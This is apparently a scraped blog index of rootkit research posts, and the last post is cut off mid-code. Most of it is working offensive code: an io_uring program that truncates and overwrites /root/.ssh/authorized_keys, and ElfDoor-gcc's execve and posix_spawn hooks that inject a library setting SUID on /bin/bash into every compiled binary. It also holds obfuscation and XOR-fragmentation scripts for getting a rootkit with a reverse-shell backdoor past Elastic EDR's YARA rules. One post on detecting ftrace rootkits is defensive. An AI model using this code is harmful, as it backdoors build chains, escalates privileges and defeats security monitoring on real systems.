normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} 